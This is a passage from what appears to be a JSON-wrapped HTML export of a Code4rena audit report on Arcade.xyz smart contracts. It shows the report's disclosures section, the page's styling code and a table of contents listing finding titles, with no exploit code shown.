8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Time spent on analysis</h3>\n<p>15 Hours</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-arcade-findings/issues/455#issuecomment-1664436925\">PowVT (Arcade.xyz) acknowledged and commented</a>:</strong></p>\n<blockquote>\n<p>Mostly duplicate findings as previous issues. Everything else is expected behavior. Will not make any fixes from this.</p>\n</blockquote>\n<hr>\n<h1 id=\"disclosures\" style=\"position:relative;\"><a href=\"#disclosures\" aria-label=\"disclosures permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Disclosures</h1>\n<p>C4 is an open organization governed by participants in the community.</p>\n<p>C4 Audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.</p>\n<p>C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.</p>\n<style class=\"grvsc-styles\">\n  .grvsc-container {\n    overflow: auto;\n    position: relative;\n    -webkit-overflow-scrolling: touch;\n    padding-top: 1rem;\n    padding-top: var(--grvsc-padding-top, var(--grvsc-padding-v, 1rem));\n    padding-bottom: 1rem;\n    padding-bottom: var(--grvsc-padding-bottom, var(--grvsc-padding-v, 1rem));\n    border-radius: 8px;\n    border-radius: var(--grvsc-border-radius, 8px);\n    font-feature-settings: normal;\n    line-height: 1.4;\n  }\n  \n  .grvsc-code {\n    display: table;\n  }\n  \n  .grvsc-line {\n    display: table-row;\n    box-sizing: border-box;\n    width: 100%;\n    position: relative;\n  }\n  \n  .grvsc-line > * {\n    position: relative;\n  }\n  \n  .grvsc-gutter-pad {\n    display: table-cell;\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  .grvsc-gutter {\n    display: table-cell;\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter::before {\n    content: attr(data-content);\n  }\n  \n  .grvsc-source {\n    display: table-cell;\n    padding-left: 1.5rem;\n    padding-left: var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem));\n    padding-right: 1.5rem;\n    padding-right: var(--grvsc-padding-right, var(--grvsc-padding-h, 1.5rem));\n  }\n  \n  .grvsc-source:empty::after {\n    content: ' ';\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    user-select: none;\n  }\n  \n  .grvsc-gutter + .grvsc-source {\n    padding-left: 0.75rem;\n    padding-left: calc(var(--grvsc-padding-left, var(--grvsc-padding-h, 1.5rem)) / 2);\n  }\n  \n  /* Line transformer styles */\n  \n  .grvsc-has-line-highlighting > .grvsc-code > .grvsc-line::before {\n    content: ' ';\n    position: absolute;\n    width: 100%;\n  }\n  \n  .grvsc-line-diff-add::before {\n    background-color: var(--grvsc-line-diff-add-background-color, rgba(0, 255, 60, 0.2));\n  }\n  \n  .grvsc-line-diff-del::before {\n    background-color: var(--grvsc-line-diff-del-background-color, rgba(255, 0, 20, 0.2));\n  }\n  \n  .grvsc-line-number {\n    padding: 0 2px;\n    text-align: right;\n    opacity: 0.7;\n  }\n  \n  .dark-default-dark {\n    background-color: #1E1E1E;\n    color: #D4D4D4;\n  }\n  .dark-default-dark .mtk1 { color: #D4D4D4; }\n  .dark-default-dark .mtk4 { color: #569CD6; }\n  .dark-default-dark .mtk11 { color: #DCDCAA; }\n  .dark-default-dark .mtk12 { color: #9CDCFE; }\n  .dark-default-dark .mtk3 { color: #6A9955; }\n  .dark-default-dark .mtk15 { color: #C586C0; }\n  .dark-default-dark .mtk7 { color: #B5CEA8; }\n  .dark-default-dark .mtk8 { color: #CE9178; }\n  .dark-default-dark .mtk10 { color: #4EC9B0; }\n  .dark-default-dark .grvsc-line-highlighted::before {\n    background-color: var(--grvsc-line-highlighted-background-color, rgba(255, 255, 255, 0.1));\n    box-shadow: inset var(--grvsc-line-highlighted-border-width, 4px) 0 0 0 var(--grvsc-line-highlighted-border-color, rgba(255, 255, 255, 0.5));\n  }\n</style>",
  "toc": "<ul>\n<li>\n<p><a href=\"#overview\">Overview</a></p>\n<ul>\n<li><a href=\"#about-c4\">About C4</a></li>\n<li><a href=\"#wardens\">Wardens</a></li>\n</ul>\n</li>\n<li><a href=\"#summary\">Summary</a></li>\n<li><a href=\"#scope\">Scope</a></li>\n<li><a href=\"#severity-criteria\">Severity Criteria</a></li>\n<li>\n<p><a href=\"#medium-risk-findings-8\">Medium Risk Findings (8)</a></p>\n<ul>\n<li><a href=\"#m-01-_syncvotingpower-can-revert-in-underflow-in-nftboostvaultsol-and-arcdvestingvaultsol\">[M-01] <code>_syncVotingPower</code> can revert in underflow in <code>NFTBoostVault.sol</code> and <code>ARCDVestingVault.sol</code></a></li>\n<li><a href=\"#m-02-proposal-vote-power-can-be-easily-manipulated\">[M-02] Proposal vote power can be easily manipulated</a></li>\n<li><a href=\"#m-03-if-someone-becomes-a-gsc-member-they-may-become-un-kickable-forever\">[M-03] If someone becomes a GSC member, they may become un-kickable forever</a></li>\n<li><a href=\"#m-04-user-voting-power-is-not-synchronized-after-multiplier-changes\">[M-04] User voting power is not synchronized after multiplier changes</a></li>\n<li><a href=\"#m-05-users-who-have-claimed-before-the-update-on-the-merkle-tree-will-have-no-shares-of-the-rewards-afterward\">[M-05] Users who have claimed before the update on the merkle tree will have no shares of the rewards afterward</a></li>\n<li><a href=\"#m-06-arcadetreasurysol-allowance-may-be-overriden\">[M-06] <code>ArcadeTreasury.sol</code> allowance may be overriden</a></li>\n<li><a href=\"#m-07-day_in_blocks-is-incorrect\">[M-07] <code>DAY_IN_BLOCKS</code> is incorrect</a></li>\n<li><a href=\"#m-08-approved-gscapprove-allowance-to-an-address-may-not-able-to-be-decreased\">[M-08] Approved <code>gscApprove</code> allowance to an address may not able to be decreased</a></li>\n<li><a href=\"#m-09-approve-zero-first\">M-09 Approve zero first</a></li>\n<li><a href=\"#m-10-the-surplus-ether-is-not-returned\">M-10 The surplus ether is not returned</a></li>\n<li><a href=\"#m-11-use-_safemint-instead-of-_mint-for-erc721\">M-11 Use <code>_safeMint</code> instead of <code>_mint</code> for ERC721</a></li>\n<li><a href=\"#m-12-unsafe-erc20-operations\">M-12 Unsafe ERC20 operations</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#low-risk-and-non-critical-issues\">Low Risk and Non-Critical Issues</a></p>\n<ul>\n<li><a href=\"#l-01-the-merkle-root-wont-revert-if-is-set-to-0x00\">L-01 The merkle root won’t revert if is set to <code>0x00</code></a></li>\n<li><a href=\"#l-02-delegate-can-be-called-with-no-voting-power\">L-02 <code>delegate()</code> can be called with no voting power</a></li>\n<li><a href=\"#l-03-use-a-two-step-transfer-function-for-the-minter-role-in-arcadetoken\">L-03 Use a two-step transfer function for the Minter role in <code>ArcadeToken</code></a></li>\n<li><a href=\"#l-04-nftboostvaultupdatenft-allows-to-deposit-any-nft\">L-04 <code>NFTBoostVault::updateNft()</code> allows to deposit any NFT</a></li>\n<li><a href=\"#l-05-if-token-has-hooks-the-grant-owner-can-revert-when-admin-try-to-revoke-the-role\">L-05 If <code>token</code> has hooks, the grant owner can revert when admin try to revoke the role</a></li>\n<li><a href=\"#l-06-if-token-has-hooks-the-manager-could-reenter-to-revokegrant-draining-the-contract\">L-06 If <code>token</code> has hooks, the manager could <code>reenter</code> to <code>revokeGrant</code> draining the contract</a></li>\n<li><a href=\"#l-07-the-storage-slotshashes-have-known-pre-images\">L-07 The storage slots/hashes have known pre-images.</a></li>\n<li><a href=\"#l-08-type-of-tokenid-in-reputationbadge-and-nftboostvault-do-not-match-and-can-lead-to-tokens-not-being-usable-as-multipliers\">L-08 Type of <code>tokenId</code> in <code>ReputationBadge</code> and <code>NftBoostVault</code> do not match and can lead to tokens not being usable as multipliers</a></li>\n<li><a href=\"#l-09-you-can-bypass-the-erc1155-check-and-deposit-anything-if-tokenid--0\">L-09 You can bypass the ERC1155 check and deposit anything if <code>tokenId == 0</code></a></li>\n<li><a href=\"#l-10-approve-zero-first\">L-10 Approve zero first</a></li>\n<li><a href=\"#non-critical-findings\">Non-Critical Findings</a></li>\n<li><a href=\"#n-01-nftboostvault-sets-an-unused-initialized-value-in-storage\">N-01 <code>NFTBoostVault</code> sets an unused <code>initialized</code> value in storage</a></li>\n<li><a href=\"#n-02-arcdvestingvault-inherits-twice-from-hashedstoragereentrancyblock\">N-02 <code>ARCDVestingVault</code> inherits twice from <code>HashedStorageReentrancyBlock</code></a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#gas-optimizations\">Gas Optimizations</a></p>\n<ul>\n<li><a href=\"#possible-optimizations-in-arcadetreasurysol\">Possible Optimizations in ArcadeTreasury.sol</a></li>\n<li><a href=\"#possible-optimizations-in-basevotingvaultsol\">Possible Optimizations in BaseVotingVault.sol</a></li>\n<li><a href=\"#possible-optimizations-in-arcdvestingvaultsol\">Possible Optimizations in ARCDVestingVault.sol</a></li>\n<li><a href=\"#possible-optimizations-in-nftboostvaultsol\">Possible Optimizations in NFTBoostVault.sol</a></li>\n<li><a href=\"#possible-optimization-in-arcadetokensol\">Possible Optimization in ArcadeToken.sol</a></li>\n<li><a href=\"#possible-optimization-in-arcadetokendistributorsol\">Possible Optimization in ArcadeTokenDistributor.sol</a></li>\n<li><a href=\"#possible-optimizations-in-reputationbadgesol\">Possible Optimizations in ReputationBadge.sol</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#audit-analysis\">Audit Analysis</a></p>\n<ul>\n<li><a href=\"#audit-analysis-summary\">Audit Analysis Summary</a></li>\n<li><a href=\"#overview-of-arcadexyz-platform\">Overview of Arcade.xyz platform</a></li>\n</ul>\n</li>\n<li><a href=\"#disclosures\">Disclosures</a></li>\n</ul>"
}